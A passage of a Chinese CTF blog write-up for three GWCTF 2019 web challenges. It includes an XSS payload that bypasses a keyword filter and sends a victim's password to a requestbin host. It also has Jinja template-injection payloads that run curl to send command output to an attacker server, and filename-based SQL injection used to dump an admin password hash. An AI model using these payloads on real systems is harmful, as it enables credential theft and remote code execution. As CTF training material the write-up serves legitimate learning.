arr = cookies[i].split(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">		<span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">		cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">typeof</span>(cookie[<span class="string">&#x27;user&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(cookie[<span class="string">&#x27;psw&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span>)&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;username&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;password&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;psw&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注册admin，失败，存在了，想用约束攻击，失败，随便注册了一个，登进去发现<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/GWCTF%202019/image.yltcaxpg3gh.png" alt="login"><br>看来不是注入了，反馈页面怎么看都像xss，看了源码，给了waf</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array($feedback))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;反馈不合法&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$blacklist = [<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;script&#x27;</span>,<span class="string">&#x27;iframe&#x27;</span>,<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;onload&#x27;</span>,<span class="string">&#x27;onerror&#x27;</span>,<span class="string">&#x27;srcdoc&#x27;</span>,<span class="string">&#x27;location&#x27;</span>,<span class="string">&#x27;svg&#x27;</span>,<span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;img&#x27;</span>,<span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;getElement&#x27;</span>,<span class="string">&#x27;document&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $val) &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(stripos($feedback,$val) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            $feedback = str_ireplace($val,<span class="string">&quot;&quot;</span>,$feedback);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>xss不太会，看了看<a target="_blank" rel="noopener" href="https://github.com/gwht/2019GWCTF/tree/master/wp/web/mypassword">官方wp</a>，说是读取cookie即可获取flag，一开始我也想外部读取，但是不会，看了wp也说被禁了，构造xss反弹到buu的平台</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;incookieput type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;</span><br><span class="line">&lt;incookieput type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;</span><br><span class="line">&lt;scrcookieipt scookierc&#x3D;&quot;.&#x2F;js&#x2F;login.js&quot;&gt;&lt;&#x2F;scrcookieipt&gt;</span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">    var psw &#x3D; docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;</span><br><span class="line">    docucookiement.locacookietion&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1bl3jrs1?psw&#x3D;&quot;+psw;</span><br><span class="line">&lt;&#x2F;scrcookieipt&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h1><p>随便输一个，这个回显真的像ssti，抓包看响应头为python，这是真ssti了，但是输入<code>&#123;&#123;1-1&#125;&#125;</code>搞了一个PHP报错？？？把docker下载下来了，看了源码，其实是出题人故意混淆的，<del>建议暴打</del> waf如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;for&#x27;</span>,<span class="string">&#x27; subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;config&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">            s =s.replace(no,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>这种过滤，一般都是对最后一个下手，例如if：iconfigf；黑名单的替换是按关键字的顺序来的，当config替换以后也就认为过滤结束了。<del>这题不给源码怎么写。。出题人真的坏</del>\</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates">模板设计器</a><br><code>&#123;% ... %&#125;</code> 控制结构清单<br><code>&#123;&#123; ... &#125;&#125;</code> 模板输出的表达式<br><code>&#123;# ... #&#125;</code> 注释<br><code># ... ##</code> 行语句</p>
+</blockquote>
+<p>由于过滤了<code>&#123;&#123;&#125;&#125;</code>，结果不能直接显示，不过可以选择打到vps上<br>payload：<code>&#123;% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://ip:port/ -d `ls /|base64`') %&#125;1&#123;% endiconfigf %&#125;</code><br>由于curl只能带出来一行，用base64可以编码一下，全部带出来<br>flag：<code>&#123;% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://ip:port/ -d `cat /flag_1s_Hera`') %&#125;1&#123;% endiconfigf %&#125;</code></p>
+<h1 id="GWCTF-2019-blog"><a href="#GWCTF-2019-blog" class="headerlink" title="[GWCTF 2019]blog"></a>[GWCTF 2019]blog</h1><p>登陆界面，sql注入没反应，注册admin已经存在，随便注册进去看URL感觉可以LFI，但是试了试发现只有admin才能读。接着是上传文件，可以上传一句话，但是不知道路径，没办法。上传文件后下面会显示文件名及上传日期，这个很像文件名注入，以前读文章见大佬博客提到过，但是没实践过，先fuzz，文件名：<code>select whereorandfrom.jpg</code>，这样fuzz，发现过滤不少，也能用burp爆破fuzz都行，简单过滤，双写就能绕过，先试试数据库名：<code>&#39;+(selselectect(hex(database())))+&#39;.jpg</code>，可以，转码为：bytectf</p>
+<p>原理可参考<a target="_blank" rel="noopener" href="https://lethe.site/2019/05/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/#upload%EF%BC%88RCTF-2015%EF%BC%89">这篇博客</a><br>猜测sql为<code>insert into 表名(&#39;filename&#39;,...) values(&#39;你上传的文件名&#39;,...);</code><br>构造上述文件名后拼接sql得：<code>...values(&#39;文件名&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+&#39;.jpg&#39;,...);</code></p>
+<p>爆表，本来想用hex直接全爆出来，但是似乎不行，可能长度有限制，还是参考了<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/104402654">大佬博客</a>，依次移动即可全部读出来：<code>&#39;+(selselectect(conv(hex(substr((selselectect(grogroupup_conconcatcat(table_name))frfromom(information_schema.tables)whewherere(table_schema=&#39;bytectf&#39;)),1,5)),16,10)))+&#39;</code>，最后表名为：byte_user<br>字段名类似，改改上面的table_name就行，不再赘述<br>查管理员密码：<code>&#39;+(selselectect(conv(hex(substr((selselectect(grogroupup_conconcatcat(password))frfromom(byte_user)whewherere(username=&#39;admin&#39;)),1,5)),16,10)))+&#39;</code><br>拼接得到：<code>3814d79033f6fc9c1d3cf002a1f92100</code><br>试了一下，不是密码，应该是md5，解密得：<code>kotori912</code></p>
+<p>登陆admin，尝试读取index源码被抓了，hint：You can try to read picture file.</p>
+<p>上传jpg提示<code>illegal ip</code>，看看network，发现cookie里面的plain可以base64解密，解密为<code>&#123;&quot;is_admin&quot;:true,&quot;ip&quot;:false&#125;</code>，encrypt提示cbc，应该就是cbc字节翻转攻击了，也是以前见过博客介绍，但是没深入研究，通过本题研究一下cbc翻转。。。研究失败，脚本不能用，这题暂时搁置</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="yq1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="yq1ng 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>yq1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yq1ng.github.io/z_post/GWCTF2019/" title="GWCTF2019 web wp">http://yq1ng.github.io/z_post/GWCTF2019/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF-WEB/" rel="tag"><i class="fa fa-tag"></i> CTF WEB</a>
+              <a href="/tags/" rel="tag"><i class="fa fa-tag"></i> ...</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/" rel="prev" title="CTFSHOW WEB入门 Ttick总结">
+      <i class="fa fa-chevron-left"></i> CTFSHOW WEB入门 Ttick总结
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/z_post/De1CTF%202019%20web/" rel="next" title="De1CTF 2019 web">
+      De1CTF 2019 web <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.</span> <span class="nav-text">[GWCTF 2019]我有一个数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.0.1.</span> <span class="nav-text">漏洞原理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96"><span class="nav-number">2.</span> <span class="nav-text">[GWCTF 2019]枯燥的抽奖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GWCTF-2019-mypassword"><span class="nav-number">3.</span> <span class="nav-text">[GWCTF 2019]mypassword</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97"><span class="nav-number">4.</span> <span class="nav-text">[GWCTF 2019]你的名字</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GWCTF-2019-blog"><span class="nav-number">5.</span> <span class="nav-text">[GWCTF 2019]blog</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yq1ng"
+      src="/images/xiaoxin.jpg">
+  <p class="site-author-name" itemprop="name">yq1ng</p>
+  <div class="site-description" itemprop="description">The best way to know your strength is to fight</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yq1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yq1ng" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/weixin_43578492" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43578492" rel="noopener" target="_blank"><i class="heartbeat fa-fw"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1578422748@qq.com" title="E-Mail → mailto:1578422748@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=%271578422748++%27&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;&#39;1578422748++&#39;&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yq1ng</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">221k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">6:08</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<br />
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("09/27/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
